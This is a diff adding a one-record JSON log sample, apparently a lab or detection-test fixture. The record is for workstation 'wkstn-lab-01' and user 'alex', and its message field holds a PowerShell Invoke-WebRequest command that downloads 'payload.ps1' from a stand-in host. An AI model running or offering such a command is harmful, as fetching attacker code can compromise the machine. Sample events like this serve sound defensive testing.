@@ -1,0 +1,6 @@
+{
+  "timestamp": "2026-04-12T12:41:00Z",
+  "host": "wkstn-lab-01",
+  "user": "alex",
+  "message": "powershell.exe Invoke-WebRequest https://update-check.example/payload.ps1"
+}
